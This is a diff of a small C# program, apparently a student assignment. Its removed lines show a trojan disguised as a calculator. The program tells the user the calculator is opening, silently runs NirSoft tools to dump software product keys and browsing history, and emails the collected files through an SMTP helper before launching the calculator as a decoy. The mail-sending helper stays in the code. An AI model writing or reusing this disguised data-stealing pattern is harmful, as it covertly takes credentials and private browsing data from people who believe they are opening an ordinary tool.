@@ -2,30 +2,11 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Net.Mail;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace TP
 {
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            Console.WriteLine("Abriendo calculadora. Por favor espere...");
-            List<string> files = new List<string>();
-
-            files.NirsoftToolExecAndAdd("ProduKey.exe");
-            files.NirsoftToolExecAndAdd("BrowsingHistoryView.exe");
-            files.NirsoftToolExecAndAdd("awatch.exe");
-
-            Helpers.sendMail("Prueba", "Estoy probando", files);
-            Helpers.openCalc();
-        }
-    }
-
-    class Helpers
+    internal class Helpers
     {
         public static void openCalc()
         {
@@ -63,14 +44,6 @@ namespace TP
             SmtpServer.EnableSsl = true;
 
             SmtpServer.Send(mail);
-        }
-    }
-
-    public static class Extensions
-    {
-        public static void NirsoftToolExecAndAdd(this List<string> list, string file)
-        {
-            list.Add(Helpers.execNirsoftTool(file));
         }
     }
 }
